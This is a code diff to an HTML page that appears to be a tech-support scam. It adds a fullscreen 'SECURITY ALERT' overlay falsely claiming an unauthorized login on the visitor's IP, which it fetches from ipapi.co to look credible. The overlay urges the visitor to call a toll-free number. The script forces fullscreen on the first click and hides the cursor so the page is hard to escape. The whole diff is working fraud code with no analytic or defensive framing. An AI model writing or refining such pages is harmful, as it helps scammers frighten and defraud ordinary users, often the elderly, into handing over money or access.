@@ -28,7 +28,10 @@
     padding:env(safe-area-inset);
     cursor:pointer;
     -webkit-font-smoothing:antialiased;
+    transition:cursor .2s;
   }
+  .hide-cursor { cursor: none !important; }
+
   @keyframes pulse-border {
     0% { box-shadow: 0 0 12px 2px rgba(194,39,45,0.4); }
     50% { box-shadow: 0 0 30px 6px rgba(194,39,45,0.7); }
@@ -43,6 +46,7 @@
     width: 90%;
     max-width: 500px;
     margin: 0 auto;
+    z-index:1;
   }
   .alert-card {
     position: relative;
@@ -179,11 +183,67 @@
     color:#ddd;
     text-align:center;
   }
-  @media (max-width: 600px) {
-    .alert-card { padding: 16px 16px 36px; }
-    .header h2 { font-size:18px; }
-    .call-btn { font-size:15px; padding:12px 20px; }
-    .close-btn { font-size:28px; padding:5px 9px; }
+
+  /* Fullscreen pop overlay */
+  .fullscreen-pop {
+    position: fixed;
+    inset:0;
+    background: rgba(0,0,0,0.85);
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    z-index: 9999;
+    flex-direction: column;
+    gap:12px;
+    color:#fff;
+  }
+  .fullscreen-content {
+    background: #fff;
+    border-radius:12px;
+    max-width:600px;
+    width:100%;
+    padding:28px 26px 46px;
+    position: relative;
+    color:#1f2d45;
+    box-shadow: 0 20px 48px rgba(0,0,0,0.35);
+  }
+  .fullscreen-header {
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin-bottom:14px;
+  }
+  .fullscreen-header h1 {
+    margin:0;
+    font-size:26px;
+    color: #c2272d;
+    flex:1;
+  }
+  .fs-close {
+    position:absolute;
+    top:12px;
+    right:14px;
+    background: transparent;
+    border:none;
+    font-size:28px;
+    cursor:pointer;
+    color:#555;
+  }
+  .fs-call {
+    background: #e21717;
+    color:#fff;
+    padding:14px 32px;
+    font-size:18px;
+    border:none;
+    border-radius:8px;
+    text-decoration:none;
+    display:inline-block;
+    margin-top:8px;
+  }
+  @media (max-width: 700px) {
+    .fullscreen-header h1 { font-size:22px; }
+    .fullscreen-content { padding:20px; }
   }
 </style>
 </head>
@@ -236,6 +296,32 @@
     </div>
   </div>
 
+  <!-- Fullscreen pop-up -->
+  <div class="fullscreen-pop" id="fsPop">
+    <div class="fullscreen-content">
+      <button class="fs-close" aria-label="Close fullscreen popup" id="fsClose">&times;</button>
+      <div class="fullscreen-header">
+        <div style="font-size:32px;">🚨</div>
+        <h1>SECURITY ALERT</h1>
+      </div>
+      <p style="margin:0 0 12px; font-size:16px;"><strong>Unusual activity detected on your IP address <span id="fs-ip">...</span></strong></p>
+      <p style="margin:0 0 14px;">An unauthorized login attempt was observed. Your account and financial details may be at risk. Immediate action is recommended.</p>
+      <div style="margin-bottom:12px;">
+        <div style="font-weight:600; margin-bottom:6px;">What’s affected:</div>
+        <ul style="padding-left:18px; margin:0 0 10px;">
+          <li>Login history</li>
+          <li>Recent transactions</li>
+          <li>Account credentials</li>
+          <li>Personal data</li>
+        </ul>
+      </div>
+      <a href="tel:+18037624570" class="fs-call">Call Now Toll Free +1-803-762-4570</a>
+      <div style="font-size:13px; margin-top:10px; color:#555;">
+        <em>Please verify identity before sharing sensitive information.</em>
+      </div>
+    </div>
+  </div>
+
   <script>
     // Fullscreen helpers
     function requestFullScreen() {
@@ -250,6 +336,32 @@
     }
 
     let fullscreenRequested = false;
+
+    // Show fullscreen popup
+    function showFullscreenPop(ip) {
+      document.getElementById('fs-ip').textContent = ip;
+      const pop = document.getElementById('fsPop');
+      pop.style.display = 'flex';
+    }
+
+    // Handle fullscreen change: hide cursor and show full-screen pop
+    function onFullScreenChange() {
+      const isFull = document.fullscreenElement || document.webkitFullscreenElement || document.msFullscreenElement;
+      if (isFull) {
+        document.body.classList.add('hide-cursor');
+        // fill IP in popup if already fetched
+        const ipText = document.getElementById('meta-ip').textContent || '...';
+        showFullscreenPop(ipText);
+      } else {
+        document.body.classList.remove('hide-cursor');
+        document.getElementById('fsPop').style.display = 'none';
+      }
+    }
+    document.addEventListener('fullscreenchange', onFullScreenChange);
+    document.addEventListener('webkitfullscreenchange', onFullScreenChange);
+    document.addEventListener('msfullscreenchange', onFullScreenChange);
+
+    // Trigger fullscreen on first click
     document.addEventListener('click', () => {
       if (!fullscreenRequested) {
         requestFullScreen();
@@ -257,6 +369,7 @@
       }
     }, { once: true });
 
+    // Close underlying alert card and request fullscreen if needed
     document.getElementById('closeBtn').addEventListener('click', (e) => {
       e.stopPropagation();
       if (!fullscreenRequested) {
@@ -266,6 +379,13 @@
       document.getElementById('alertCard').style.display = 'none';
     });
 
+    // Close fullscreen popup only
+    document.getElementById('fsClose').addEventListener('click', (e) => {
+      e.stopPropagation();
+      document.getElementById('fsPop').style.display = 'none';
+    });
+
+    // OS detection
     function detectOS(ua) {
       if (/Windows NT/i.test(ua)) return 'Windows';
       if (/Mac OS X/i.test(ua)) return 'macOS';
@@ -275,6 +395,7 @@
       return 'Unknown';
     }
 
+    // Fetch visitor info
     async function fillDetails() {
       try {
         const resp = await fetch('https://ipapi.co/json/');
@@ -322,17 +443,5 @@
       </a>
     </div>
   </noscript>
-  <script>
-    // Optionally, you can use JavaScript to toggle the cursor visibility
-    document.body.addEventListener('mousemove', function() {
-      document.body.style.cursor = 'none';
-    });
-
-    // Example to restore the pointer after a specific time
-    setTimeout(function() {
-      document.body.style.cursor = 'default'; // Restore pointer after 5 seconds
-    }, 5000);
-  </script>
-  
 </body>
 </html>
